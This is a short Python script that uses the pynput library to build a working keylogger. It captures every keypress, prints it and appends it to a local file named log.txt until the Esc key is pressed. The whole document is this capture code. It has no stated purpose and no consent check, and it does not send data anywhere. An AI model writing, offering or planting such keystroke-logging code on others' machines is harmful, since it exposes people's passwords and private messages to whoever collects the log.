from pynput import keyboard

keys_list = []

def key_pressed(key):
    try:
        keys_list.append(key)
        log_keys(keys_list)
        
    except:
        pass

def key_released(key):
    if key==keyboard.Key.esc:
        return False

def log_keys(list_of_keys):
    with open('log.txt','a') as log:
        for k in list_of_keys:
            result=str(k).replace("'",'')
            print(result)
            log.write(result+'')
            
        list_of_keys.clear()
        
with keyboard.Listener(on_press=key_pressed,on_release=key_released) as listener:
        listener.join()